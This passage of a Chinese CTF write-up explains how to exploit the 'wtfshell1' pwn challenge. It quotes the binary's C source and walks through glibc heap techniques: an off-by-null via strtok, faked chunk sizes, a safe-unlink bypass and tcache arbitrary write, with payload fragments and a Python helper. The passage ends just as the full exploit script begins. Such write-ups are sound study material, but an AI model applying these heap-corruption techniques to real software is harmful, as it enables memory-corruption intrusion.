&#125;</span><br><span class="line">                <span class="built_in">strcat</span>(gfiles[i]-&gt;fdata, rbuff);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* File is empty -&gt; write the content directly */</span></span><br><span class="line">                gfiles[i]-&gt;fdata = strdup(rbuff);</span><br><span class="line">            &#125;</span><br><span class="line">            xfree(rbuff);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    write_str(<span class="string">&quot;rip: \&quot;&quot;</span>);</span><br><span class="line">    write_str(fname);</span><br><span class="line">    write_str(<span class="string">&quot;\&quot; ∉ ℱ\n&quot;</span>);</span><br><span class="line">    xfree(rbuff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意代码中我注释的 this 和 that 部分。</p>
<p>关注到 <code>remove_slash</code>  函数，会将字符串中含 \ 的部分置为 \x00：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_slash</span><span class="params">(<span class="keyword">char</span> *fname)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fname_len = <span class="built_in">strlen</span>(fname);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fname_len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fname[i] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            fname[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时也是通过 <code>strlen</code>  来判断长度。</p>
<p><code>menu</code>  与 <code>cmd_rip</code>  函数中，按先后顺序调用了如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *token = strtok(gbuff, delim);</span><br><span class="line"><span class="keyword">char</span> *fname = strtok(<span class="literal">NULL</span>, delim);#<span class="meta">#this!</span></span><br><span class="line">remove_slash(fname);<span class="meta">#that!</span></span><br></pre></td></tr></table></figure>
<p>如果我们构造这样的 payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;rip.&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x400</span>-<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>同时，在之前堆风水写 <code>gbuff</code>  的第 0x400-0x408 字节，若我们填入如下内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p16(prev_size)+<span class="string">b&#x27;\&#x27;*6</span></span><br></pre></td></tr></table></figure>
<p>那么在执行第一句语句之后，返回的指针已经指向</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x400</span>-<span class="number">4</span>)+p16(prev_size)+<span class="string">b&#x27;\&#x27;*6</span></span><br></pre></td></tr></table></figure>
<p>注意 strtok 第一个参数为 NULL 时，继承的是上一次 strtok 返回的指针。</p>
<p>因此执行第二句语句之后，能够将 <code>off-by-null</code>  的 size 头低位 0x21 置为 0，触发 <code>off-by-null</code></p>
<p>同时，执行第三句语句，将调整我们的 <code>prev_size</code>  为正常。</p>
<p>因此至此，我们已经构造好 <code>prev_size</code> 。</p>
<h6 id="fake_size"><a class="markdownIt-Anchor" href="#fake_size">#</a> fake_size</h6>
<p>我们知道，free 一个堆块，会去检测下一个堆块的 <code>next_size</code>  是否合法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>我们 free 掉 <code>off-by-null-chunk</code>  的时候，除非 <code>off-by-null-chunk</code>  的 size 本身为 <code>0x501</code>  这种，off by null 之后不用伪造 <code>next_size</code> 。否则需要伪造合法的 <code>next_size</code> ，不然 free 会触发错误。</p>
<p>伪造 <code>next_size</code>  的过程几乎没有希望的，之前看来：</p>
<p>首先 <code>off-by-null-chunk</code>  的 size 需要大于 0x400（不能在 tcache 范围），在 tcache 范围内的 <code>tcache_off-by-null</code>  是没有作用的。</p>
<p>这就意味着我们申请的 <code>off-by-null-chunk</code>  的 size 需要大于 0x400，那就只能调用 <code>cmd_rip</code>  来申请，其他都不能申请大于 0x400 size 的 chunk。而 <code>cmd_rip</code>  的操作是根据 <code>strlen</code>  函数返回的长度来进行 <code>realloc</code>  的，也就是说，我们申请出某个 size 的堆块，就必须填满他。</p>
<p><code>cmd_rip</code>  中部分代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span> <span class="comment">/* ignore flag1 */</span>; i &lt; FILEMAX; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (gfiles[i] &amp;&amp; gfiles[i]-&gt;fname &amp;&amp; !<span class="built_in">strcmp</span>(gfiles[i]-&gt;fname, fname)) &#123;</span><br><span class="line">            <span class="comment">/* The file&#x27;s owner must be root or the current user, and the file must be writable */</span></span><br><span class="line">            <span class="keyword">if</span> ((curr_uid != <span class="number">0</span> &amp;&amp; gfiles[i]-&gt;fuid != curr_uid) || !(gfiles[i]-&gt;fflag &amp; WRPERM)) &#123;</span><br><span class="line">                write_str(<span class="string">&quot;rip: ¬ perm\n&quot;</span>);</span><br><span class="line">                xfree(rbuff);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read_max(rbuff, SBSIZE);</span><br><span class="line">            <span class="keyword">if</span> (gfiles[i]-&gt;fdata) &#123;</span><br><span class="line">                <span class="comment">/* File is not empty -&gt; rewrite the file content */</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strlen</span>(rbuff) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    gfiles[i]-&gt;fdata = xrealloc(gfiles[i]-&gt;fdata, <span class="built_in">strlen</span>(gfiles[i]-&gt;fdata) + <span class="built_in">strlen</span>(rbuff) + <span class="number">1</span>); <span class="comment">// Remember the extra null byte</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">strcat</span>(gfiles[i]-&gt;fdata, rbuff);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* File is empty -&gt; write the content directly */</span></span><br><span class="line">                gfiles[i]-&gt;fdata = strdup(rbuff);</span><br><span class="line">            &#125;</span><br><span class="line">            xfree(rbuff);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>但我们要伪造 <code>fake_next_size</code> ， <code>fake_next_size</code>  中肯定带 <code>\x00</code>  截断，同时由于 <code>off-by-null-chunk</code>  原本 size 低字节为 0x21，被改成 \x00 后， <code>fake_next_size</code>  要放在 <code>off-by-null-chunk</code>  的 + 0x500 处，例如如下结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">off-by-null-chunk：</span><br><span class="line">	0 0x500(0x521)</span><br><span class="line">	........</span><br><span class="line">	........</span><br><span class="line">	padding,fake_next_size</span><br><span class="line">	padding,padding。</span><br></pre></td></tr></table></figure>
<p>其中 padding 为 8 非零字节。可以注意到 <code>fake_next_size</code>  中带 \x00 截断，因此我们不能申请到 0x521 大小的 chunk。</p>
<p>想过很多种方法，例如利用 <code>realloc</code>  去进行一些 trick，例如：</p>
<p>先申请出 0x521 大小的 chunk，然后利用 <code>cmd_wtf</code>  里的 <code>strcpy</code>  往里填入零字节，再利用 <code>cmd_rip</code>  来 realloc 到适当字节，恰好写进 <code>fake_next_size</code> ，但是对一个内存大于申请 size 的堆块进行 <code>realloc</code> ，会 free 掉剩余 size 的小 chunk：</p>
<p>例如对 0x521 chunk 进行 <code>reallc(ptr,0x410)</code> ，他会 free 掉剩余的 0x100 字节。这样会破坏掉原来 chunk 的 size 头，导致我们不能触发 <code>off-by-null</code> 。</p>
<p>可见对大于 0x400 size 的 chunk 去写入一个 <code>fake_next_size</code>  是非常困难的。</p>
<p>转换思路呢？可能一开始就想错了，为什么 <code>off-by-null-chunk</code> size 一定要大于 0x400 呢？他的 size 可以是 0x321，只要我们提前填满对应 size 的 <code>tcache_list</code>  即可。</p>
<p>而如果 size 小于 0x400，我们观察 <code>cmd_wtf</code>  函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_wtf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *fdata = strtok(<span class="literal">NULL</span>, delim);</span><br><span class="line">    <span class="keyword">if</span> (!fdata) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;wtf: data ∈ ∅\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *fname = strtok(<span class="literal">NULL</span>, delim);</span><br><span class="line">    <span class="keyword">if</span> (!fname) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;wtf: file ∈ ∅\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_slash(fname);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(fname) == <span class="number">0</span>) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;wtf: file = ∅\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Special case: flag1 cannot be altered */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(fname, <span class="string">&quot;flag1&quot;</span>)) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;wtf: ¬ perm\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span> <span class="comment">/* ignore flag1 */</span>; i &lt; FILEMAX; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (gfiles[i] &amp;&amp; gfiles[i]-&gt;fname &amp;&amp; !<span class="built_in">strcmp</span>(gfiles[i]-&gt;fname, fname)) &#123;</span><br><span class="line">            <span class="comment">/* The file&#x27;s owner must be root or the current user, and the file must be writable */</span></span><br><span class="line">            <span class="keyword">if</span> ((curr_uid != <span class="number">0</span> &amp;&amp; gfiles[i]-&gt;fuid != curr_uid) || !(gfiles[i]-&gt;fflag &amp; WRPERM)) &#123;</span><br><span class="line">                write_str(<span class="string">&quot;wtf: ¬ perm\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (gfiles[i]-&gt;fdata) &#123;</span><br><span class="line">                <span class="comment">/* File is not empty -&gt; rewrite the file content */</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strlen</span>(fdata) &gt; <span class="built_in">strlen</span>(gfiles[i]-&gt;fdata)) &#123;</span><br><span class="line">                    gfiles[i]-&gt;fdata = xrealloc(gfiles[i]-&gt;fdata, <span class="built_in">strlen</span>(fdata) + <span class="number">1</span>); <span class="comment">// Remember the extra null byte</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">strcpy</span>(gfiles[i]-&gt;fdata, fdata);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* File is empty -&gt; write the content directly */</span></span><br><span class="line">                gfiles[i]-&gt;fdata = strdup(fdata);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    write_str(<span class="string">&quot;wtf: \&quot;&quot;</span>);</span><br><span class="line">    write_str(fname);</span><br><span class="line">    write_str(<span class="string">&quot;\&quot; ∉ ℱ\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中关键的即为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (gfiles[i]-&gt;fdata) &#123;</span><br><span class="line">                <span class="comment">/* File is not empty -&gt; rewrite the file content */</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strlen</span>(fdata) &gt; <span class="built_in">strlen</span>(gfiles[i]-&gt;fdata)) &#123;</span><br><span class="line">                    gfiles[i]-&gt;fdata = xrealloc(gfiles[i]-&gt;fdata, <span class="built_in">strlen</span>(fdata) + <span class="number">1</span>); <span class="comment">// Remember the extra null byte</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">strcpy</span>(gfiles[i]-&gt;fdata, fdata);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* File is empty -&gt; write the content directly */</span></span><br><span class="line">                gfiles[i]-&gt;fdata = strdup(fdata);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>若 <code>strlen(fdata)&lt;strlen(gfiles[i]-&gt;fdata)</code> ，是不会触发 <code>realloc</code>  的，而是直接调用 <code>strcpy</code> ，也就是说，我们可以提前填满一个堆块，然后利用这个 fdata size 更小的时候，从后往前填充 \x00 字节，这样就能够伪造好我们的 <code>fake_next_size</code> 。</p>
<p>后续写入地址也多次用到这个方式，因此我封装了一个函数 (不太优雅，将就着看)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">write_addr</span><span class="params">(filename,payload,size)</span>:</span></span><br><span class="line"><span class="function">    whole_size </span>= len(payload)+<span class="number">1</span></span><br><span class="line">    no_null_payload = payload.replace(b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>,b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i in range(size):</span><br><span class="line">        <span class="meta"># log.success(hex(i))</span></span><br><span class="line">        <span class="keyword">if</span> no_null_payload[whole_size-i<span class="number">-2</span>:whole_size-i<span class="number">-1</span>] == b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>:</span><br><span class="line">            <span class="meta"># pause()</span></span><br><span class="line">            recover_data(filename,no_null_payload[<span class="number">0</span>:whole_size-i<span class="number">-2</span>])</span><br><span class="line">            <span class="meta"># debug(<span class="meta-string">&quot;free&quot;</span>)</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<h4 id="实操off-by-null"><a class="markdownIt-Anchor" href="#实操off-by-null">#</a> 实操 off by null</h4>
<p>整理一下我们之前做到的事情：</p>
<ul>
<li>分配了一个被填满的 gbuff，能够 off by null。</li>
<li>可以利用 <code>remove_slash</code>  和 <code>strtok</code>  配合，构造好 <code>off-by-null-chunk</code>  的 <code>prev_size</code> 。（前提是该 chunk size 得小于 0x400，因此我们需要提前填满对应 size 的 <code>tcache_list</code> ）</li>
<li>可以用我的 <code>write_addr</code>  函数伪造 <code>off-by-null-chunk</code>  的 <code>fake_size</code> 。</li>
</ul>
<p>并且这道题我们已经用侧信道泄露了堆地址，大大降低了 <code>off-by-null</code>  的难度，可以进行 <code>safe-unlink</code> 。</p>
<p>只用在上方伪造一个 size，然后绕过如下检测即可：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>堆风水：</p>
<p>如果我们构造成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0  fake_size</span><br><span class="line">fake_fd fake_bk</span><br><span class="line">fake_fd_nextsize fake_bk_nextsize</span><br><span class="line">P-&gt;addr</span><br></pre></td></tr></table></figure>
<p>这里注意的是， <code>p-&gt;fd-&gt;bk</code>  和 <code>p-&gt;bk-&gt;fd</code>  指向的地方，不能和 <code>p-&gt;fd_nextsize-&gt;bk_nextsize</code>  和 <code>p-&gt;bk_nextsize-&gt;fd_nextsize</code>  指向的地方相同，否则在通过第一个检测之后，会执行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure>
<p>就绕不过第二个检测：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>因此最终构造为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0  fake_size</span><br><span class="line">fake_fd fake_bk</span><br><span class="line">fake_fd_nextsize fake_bk_nextsize</span><br><span class="line">P-&gt;addr P-&gt;addr</span><br></pre></td></tr></table></figure>
<p><img data-src="https://tvax2.sinaimg.cn/large/008qDYGVgy1h8o78mulzqj30ib0av49z.jpg" alt="1"></p>
<p>这里我在 <code>off-by-null-chunk</code>  下方没有构造好，导致一个 <code>tcache</code>  的 <code>prev_inuse</code>  为 0，触发了第二次 <code>unlink</code> ，小调整了一下即可。</p>
<p><code>off-by-null</code>  之后，中间夹了几个 <code>tcache</code> ，即可实现泄露和任意地址写。</p>
<p>需要注意的是：</p>
<p>能够任意写的 <code>tcache</code>  size 必须要小，因为 <code>cmd</code>  中任何申请函数都是以 <code>strlen</code>  返回结果来进行 malloc 的，也就是说，如果我们想申请任意写，我们就必须填满其 chunk。例如我最开始构造的 <code>tcache</code>  size 为 0x300，这样的话，申请过去的堆块必须填满 0x2f0 内容。</p>
<p><code>wtfshell1</code>  中，我的思路是申请到 <code>flag1</code>  堆块，更改其 <code>file-&gt;flag</code>  为 3 (rw) 与 <code>file-&gt;name</code> 。</p>
<p>如果任意写的 <code>tcache_size</code>  过大，申请过去必须得写完，这会导致把堆上很多指针或者 <code>file-&gt;name</code>  破坏掉。</p>
<p><code>wtfshell2</code>  中，我的思路是打 libc got 表，那 0x2f0 大小必定会破坏掉非常多东西，因此也是不可能的。</p>
<p>因此做到这之后，我又重新调整 <code>tcache_size</code> ，小改了一波堆风水。</p>
<h3 id="夹心饼攻击"><a class="markdownIt-Anchor" href="#夹心饼攻击">#</a> 夹心饼攻击</h3>
<p>至此我们已经拿到 <code>heap_base</code> ， <code>libc_base</code> ，并且有了任意写，泄露之后申请任意写过去改掉 <code>file-&gt;flag</code>  为 3 (rw) 与 <code>file-&gt;name</code> 。</p>
<p>观察 <code>cmd_omfg</code> : 发现如果是 root 用户，可以查看所有文件内容 (若具有可读属性)。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_omfg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *fname = strtok(<span class="literal">NULL</span>, delim);</span><br><span class="line">    <span class="keyword">if</span> (!fname) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;omfg: file ∈ ∅\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    remove_slash(fname);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(fname) == <span class="number">0</span>) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;omfg: file = ∅\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; FILEMAX; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (gfiles[i] &amp;&amp; gfiles[i]-&gt;fname &amp;&amp; !<span class="built_in">strcmp</span>(gfiles[i]-&gt;fname, fname)) &#123;</span><br><span class="line">            <span class="comment">/* The file&#x27;s owner must be root or the current user, and the file must be readable */</span></span><br><span class="line">            <span class="keyword">if</span> ((curr_uid != <span class="number">0</span> &amp;&amp; gfiles[i]-&gt;fuid != curr_uid) || !(gfiles[i]-&gt;fflag &amp; RDPERM)) &#123;</span><br><span class="line">                write_str(<span class="string">&quot;omfg: ¬ perm\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!gfiles[i]-&gt;fdata) &#123; <span class="comment">// empty file</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            write_str(gfiles[i]-&gt;fdata);</span><br><span class="line">            write_str(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    write_str(<span class="string">&quot;omfg: \&quot;&quot;</span>);</span><br><span class="line">    write_str(fname);</span><br><span class="line">    write_str(<span class="string">&quot;\&quot; ∉ ℱ \n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于我已经将 <code>file-&gt;flag</code>  改为 3， <code>file-&gt;name</code>  改为 <code>aaaaaaaaaaaaaaaa</code> 。</p>
<p>直接调用 show 即可打印出第一个 flag。</p>
<p><img data-src="https://tvax1.sinaimg.cn/large/008qDYGVgy1h8o84bruryj30lf02qdhj.jpg" alt="2"></p>
<p>至此， <code>wtfshell1</code>  get。</p>
<h3 id="wtfshell1-exp"><a class="markdownIt-Anchor" href="#wtfshell1-exp">#</a> wtfshell1-exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span 